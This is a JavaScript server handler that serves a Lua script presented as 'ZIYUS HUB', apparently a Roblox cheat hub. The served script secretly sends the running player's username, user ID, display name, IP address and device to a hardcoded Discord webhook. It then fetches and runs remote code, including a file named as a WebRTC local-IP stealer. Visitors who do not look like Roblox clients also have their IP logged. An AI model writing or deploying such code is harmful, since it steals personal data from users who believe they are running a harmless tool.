export default async function handler(req, res) {
  const realIp = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
                 req.headers['x-real-ip'] ||
                 req.headers['cf-connecting-ip'] ||
                 req.headers['x-vercel-forwarded-for'] ||
                 req.socket.remoteAddress || 'Unknown';

  const userAgent = req.headers['user-agent'] || '';
  const WEBHOOK = 'https://discord.com/api/webhooks/1444992746854289408/xElRiKCryMi--rjyZeQYnF4fozUJmW4-pRYpPZ-5cgD4BmrRlr7LTH-aoxrm07VQL2nz';

  const isRoblox = /Roblox|RobloxStudio/i.test(userAgent);
  const isBot = /curl|wget|fetch|python|axios|postman|got|http|bot/i.test(userAgent) || userAgent.length < 50;

  if (!isRoblox || isBot) {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Skidder Blocked",
          color: 16711680,
          fields: [
            { name: "IP", value: realIp },
            { name: "User-Agent", value: userAgent.slice(0,1000) }
          ]
        }]
      })
    });
    return res.status(200).send("ZIYUS DETECTED YOU");
  }

  const payload = `-- ZIYUS HUB | FULLY MOBILE & CONSOLE COMPATIBLE
repeat wait() until game:IsLoaded()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

spawn(function()
    if plr then
        local req = syn and syn.request
                 or Krnl and Krnl.request
                 or fluxus and fluxus.request
                 or delta and delta.request
                 or http_request
                 or request
                 or http and http.request

        if req then
            req({
                Url = "${WEBHOOK}",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    embeds = {{
                        title = "Executed ZIYUS HUB",
                        color = 65433,
                        fields = {
                            {name = "Username", value = plr.Name},
                            {name = "UserID", value = tostring(plr.UserId)},
                            {name = "DisplayName", value = plr.DisplayName},
                            {name = "IP", value = "${realIp}"},
                            {name = "Device", value = (plr.OsPlatform or "PC")}
                        },
                        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                    }}
                })
            })
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Secret-Employee-Hub/SCRIPT-KIDDIE/refs/heads/main/noskidding"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/public/main/ip-loggers/webrtc-localip-stealer.lua"))()`;

  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Cache-Control', 'no-store, no-cache must-revalidate');
  res.status(200).send(payload);
}

export const config = { api: { bodyParser: false } };
